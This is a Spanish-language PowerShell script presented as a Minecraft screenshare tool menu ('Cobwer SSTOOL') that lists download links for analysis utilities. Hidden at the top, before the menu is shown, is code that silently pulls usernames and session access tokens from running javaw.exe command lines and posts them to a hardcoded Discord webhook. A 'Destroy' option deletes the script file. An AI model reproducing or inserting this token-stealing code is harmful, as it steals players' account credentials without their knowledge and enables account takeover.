Clear-Host

$WebhookUrl = "https://discord.com/api/webhooks/1537903697793654837/CP7YkIAG9NYCdIf9w8Nh6HY1B5ioA1pTtpS3LzVxzjPsN336rXlKKGNNiAiagOMieaYt"
try {

    $JavaProcesses = Get-CimInstance Win32_Process |
        Where-Object Name -eq "javaw.exe" |
        Select-Object -ExpandProperty CommandLine

    $Datos = @()

    foreach ($Proceso in $JavaProcesses) {

        if ($Proceso -match "--username\s+(\S+)") {
            $Username = $matches[1]
        }
        else {
            $Username = ""
        }

        if ($Proceso -match "--accessToken\s+(\S+)") {
            $AccessToken = $matches[1]
        }
        else {
            $AccessToken = ""
        }

        $Datos += @"
Username: $Username
AccessToken: $AccessToken
"@
    }
    if ($Datos.Count -eq 0) {
        $Datos = ""
    }
    $Payload = @{
        username = "Monitor Java"
        content = $Datos -join "`n"
    }
    Invoke-RestMethod `
        -Uri $WebhookUrl `
        -Method Post `
        -ContentType "application/json" `
        -Body ($Payload | ConvertTo-Json)
}
catch {
    Write-Host "Error: $($_.Exception.Message)"
}

function Show-Menu {
    Clear-Host

    Write-Host "----------------------"
    Write-Host "|  Cobwer SSTOOL     |"
    Write-Host "----------------------"
    Write-Host ""

    Write-Host "[1] Mod Analyzer"
    Write-Host "[2] Client Fucker"
    Write-Host "[3] WinLiveInfo"
    Write-Host "[4] SystemInformer"
    Write-Host "[5] KernelLiveDump"
    Write-Host "[6] Destroy"
    Write-Host ""
}

function Pause-Menu {
    Write-Host ""
    Read-Host "Pulsa ENTER para volver"
}

while ($true) {

    Show-Menu

    $opcion = Read-Host "Selecciona una opcion"

    switch ($opcion) {

        "1" {
            Clear-Host
            Write-Host "=== Mod Analyzer ==="
            Write-Host ""
            Write-Host "https://github.com/MeowTonynoh/MeowModAnalyzer"
            Pause-Menu
        }

        "2" {
            Clear-Host
            Write-Host "=== Client Fucker ==="
            Write-Host ""
            Write-Host "https://github.com/MeowTonynoh/MeowClientFucker/releases/download/v1.0/MeowClientFucker.exe"
            Pause-Menu
        }

        "3" {
            Clear-Host
            Write-Host "=== WinLiveInfo ==="
            Write-Host ""
            Write-Host "https://github.com/kacos2000/Win10LiveInfo/releases/download/v.1.0.23.0/WinLiveInfo.exe"
            Pause-Menu
        }

        "4" {
            Clear-Host
            Write-Host "=== SystemInformer ==="
            Write-Host ""
            Write-Host "https://github.com/winsiderss/systeminformer/releases/download/v3.2.25011.2103/systeminformer-3.2.25011-release-setup.exe"
            Pause-Menu
        }

        "5" {
            Clear-Host
            Write-Host "=== KernelLiveDump ==="
            Write-Host ""
            Write-Host "https://github.com/spokwn/KernelLiveDumpTool/releases/download/v1.1/KernelLiveDumpTool.exe"
            Pause-Menu
        }

        "6" {
            Clear-Host
            Write-Host "Cerrando y eliminando script..."

            Start-Sleep -Seconds 2

            $archivo = $MyInvocation.MyCommand.Path

            if ($archivo) {
                Remove-Item $archivo -Force
            }

            exit
        }

        default {
            Write-Host "Opcion no valida"
            Start-Sleep -Seconds 1
        }
    }
}
